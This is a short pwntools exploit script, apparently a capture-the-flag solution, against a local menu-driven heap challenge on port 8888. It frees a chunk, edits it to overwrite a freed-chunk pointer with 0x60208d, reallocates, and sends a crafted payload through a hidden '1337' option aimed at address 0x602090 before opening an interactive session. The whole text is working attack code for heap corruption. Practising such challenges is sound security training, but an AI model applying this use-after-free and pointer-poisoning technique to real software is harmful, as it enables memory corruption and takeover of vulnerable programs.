from pwn import *

r = remote("127.0.0.1", 8888)

def new():
	r.recvuntil("> ")
	r.sendline("1")

def edit(data):
	r.recvuntil("> ")
	r.sendline("2")
	r.recvuntil("? ")
	r.send(data)

def show():
	r.recvuntil("> ")
	r.sendline("3")
	r.recvuntil(": ")
	return r.recvline()[:-1]

def delete():
	r.recvuntil("> ")
	r.sendline("4")

def magic(data):
	r.recvuntil("> ")
	r.sendline("1337")
	r.recvuntil("Fill ")
	r.send(data)	

new()
delete()
edit(p64(0x60208d))
new()
magic("\x00" * 0x2b + p64(0x602090))



r.interactive()

